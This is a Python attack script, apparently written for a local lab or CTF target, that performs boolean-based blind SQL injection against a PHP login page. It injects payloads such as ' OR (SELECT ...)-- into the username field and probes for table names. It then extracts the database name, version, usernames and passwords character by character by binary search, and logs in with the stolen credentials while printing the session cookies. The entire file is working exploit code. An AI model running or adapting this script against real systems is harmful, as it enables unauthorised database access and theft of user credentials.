#!/usr/bin/env python3

import requests
import sys
import time

# Configuration
TARGET_URL = "http://127.0.0.1:33210/index.php"
PHPSESSID = "pr8716h5ra06p5lchf9osb22qr"

# Session setup with cookie
session = requests.Session()
session.cookies.set("PHPSESSID", PHPSESSID)

def check_boolean_condition(payload):
    """Sends POST request with injected payload and checks boolean condition."""
    data = {
        "username": payload,
        "password": "test",
        "submit": "Login"
    }
    
    try:
        response = session.post(TARGET_URL, data=data, timeout=10)
        
        if "password" in response.text:
            return True
        elif "username" in response.text:
            return False
        else:
            print(f"[!] Unexpected response: {response.text[:200]}")
            return False
    except Exception as e:
        print(f"[!] Error during request: {e}")
        return False

def test_table_exists(table_name):
    """Test if a table exists."""
    payload = f"' OR (SELECT COUNT(*) FROM {table_name}) >= 0--"
    return check_boolean_condition(payload)

def test_column_exists(table_name, column_name):
    """Test if a column exists in a table."""
    payload = f"' OR (SELECT {column_name} FROM {table_name} LIMIT 1) IS NULL--"
    return check_boolean_condition(payload)

def extract_length(column, table="users", where_condition="1=1"):
    """Extract the length of a column value using binary search."""
    print(f"[*] Extracting length of {column} from {table}...")
    
    low, high = 0, 50
    
    for mid in range(low, high + 1):
        payload = f"' OR (SELECT LENGTH({column}) FROM {table} WHERE {where_condition} LIMIT 1) > {mid}--"
        is_true = check_boolean_condition(payload)
        
        if not is_true:
            length = mid
            print(f"[+] {column} length: {length}")
            return length
    
    print(f"[!] Could not determine length")
    return 0

def extract_character(column, position, table="users", where_condition="1=1"):
    """Extract a single character at position using binary search."""
    low, high = 32, 126
    
    while low <= high:
        mid = (low + high) // 2
        
        # Test if ASCII value > mid
        payload = f"' OR (SELECT ASCII(SUBSTRING({column},{position},1)) FROM {table} WHERE {where_condition} LIMIT 1) > {mid}--"
        gt_result = check_boolean_condition(payload)
        
        if gt_result:
            low = mid + 1
        else:
            # Test if ASCII value = mid
            payload_eq = f"' OR (SELECT ASCII(SUBSTRING({column},{position},1)) FROM {table} WHERE {where_condition} LIMIT 1) = {mid}--"
            eq_result = check_boolean_condition(payload_eq)
            
            if eq_result:
                return chr(mid)
            else:
                high = mid - 1
    
    return None

def extract_string(column, table="users", where_condition="1=1"):
    """Extract full string column value character by character."""
    print(f"\n[*] Extracting {column} from {table}...")
    
    length = extract_length(column, table, where_condition)
    if length == 0:
        return None
    
    result = ""
    for pos in range(1, length + 1):
        char = extract_character(column, pos, table, where_condition)
        if char is None:
            print(f"[!] Failed to extract character at position {pos}")
            break
        
        result += char
        print(f"[+] {column} ({pos}/{length}): {result}")
    
    return result

def test_common_queries():
    """Test different query structures to find what works."""
    
    # Test 1: Simple query without table
    print("\n[Test 1: Simple conditional query]")
    payload = "' OR 1=1--"
    result = check_boolean_condition(payload)
    print(f"' OR 1=1--: {'TRUE' if result else 'FALSE'}")
    
    # Test 2: Check if information_schema exists
    print("\n[Test 2: Check information_schema]")
    payload = "' OR (SELECT COUNT(*) FROM information_schema.tables) > 0--"
    result = check_boolean_condition(payload)
    print(f"information_schema exists: {'TRUE' if result else 'FALSE'}")
    
    # Test 3: Count users if possible
    print("\n[Test 3: Count users]")
    payload = "' OR (SELECT COUNT(*) FROM users) > 0--"
    result = check_boolean_condition(payload)
    print(f"Users table exists with data: {'TRUE' if result else 'FALSE'}")
    
    # Test 4: Try different table names
    table_names = ['users', 'user', 'accounts', 'account', 'admins', 'admin', 'member', 'members']
    print(f"\n[Test 4: Testing table names]")
    for table in table_names:
        exists = test_table_exists(table)
        print(f"Table '{table}' exists: {'TRUE' if exists else 'FALSE'}")
    
    # Test 5: Extract database name
    print("\n[Test 5: Extract database name]")
    db_name = extract_string('database()', table='users', where_condition='1=1')
    print(f"Database name: {db_name}")
    
    # Test 6: Extract version
    print("\n[Test 6: Extract MySQL version]")
    version = extract_string('version()', table='users', where_condition='1=1')
    print(f"Version: {version}")

def try_alternative_extraction():
    """Try alternative ways to extract data."""
    
    # Try to get all usernames
    print("\n[*] Extracting all usernames from users table...")
    
    # First, get count of users
    for username_offset in range(5):
        print(f"\n[*] Trying to extract username at offset {username_offset}...")
        username = extract_string(
            'username', 
            'users', 
            f'1=1 LIMIT 1 OFFSET {username_offset}'
        )
        if username:
            print(f"[+] Found username: {username}")
            
            # Try to extract password for this user
            password = extract_string(
                'password', 
                'users', 
                f'username="{username}" LIMIT 1'
            )
            print(f"[+] Password for {username}: {password}")
            
            if username.lower() in ['admin', 'administrator', 'root']:
                return username, password
    
    return None, None

def attempt_login_with_params(extracted_username, extracted_password):
    """Attempt login with extracted credentials."""
    print(f"\n[*] Attempting login...")
    print(f"[*] Username: {extracted_username}")
    print(f"[*] Password: {extracted_password}")
    
    data = {
        "username": extracted_username,
        "password": extracted_password,
        "submit": "Login"
    }
    
    try:
        response = session.post(TARGET_URL, data=data, timeout=10)
        
        print(f"[+] Login response status: {response.status_code}")
        print(f"[+] Response body:\n{response.text}")
        
        # Check for successful login indicators
        if "password" in response.text.lower():
            print("[!] Login failed - still asking for password")
            return False
        elif "logout" in response.text.lower():
            print("[+] Login successful!")
            return True
        else:
            print("[?] Unclear result - check response")
            return None
            
    except Exception as e:
        print(f"[!] Error during login: {e}")
        return False

def main():
    print("=" * 70)
    print("Boolean-Based Blind SQL Injection - Advanced Extraction")
    print("Target: http://127.0.0.1:33210/index.php")
    print("=" * 70)
    
    # First test what works
    test_common_queries()
    
    # Try alternative extraction
    username, password = try_alternative_extraction()
    
    if username and password:
        print("\n" + "=" * 70)
        print("EXTRACTED CREDENTIALS:")
        print(f"Username: {username}")
        print(f"Password: {password}")
        print("=" * 70)
        
        # Attempt login
        success = attempt_login_with_params(username, password)
        
        # Print cookies
        print(f"\n[+] Session cookie: PHPSESSID={session.cookies['PHPSESSID']}")
        for cookie in session.cookies:
            if cookie.name != 'PHPSESSID':
                print(f"[+] Cookie: {cookie.name}={cookie.value}")
        
        if success:
            print("\n[!] SUCCESS: Login verified with extracted credentials!")
        else:
            print("\n[!] Verify credentials manually - check response above")
    else:
        print("\n[!] Could not extract valid credentials")

if __name__ == "__main__":
    main()

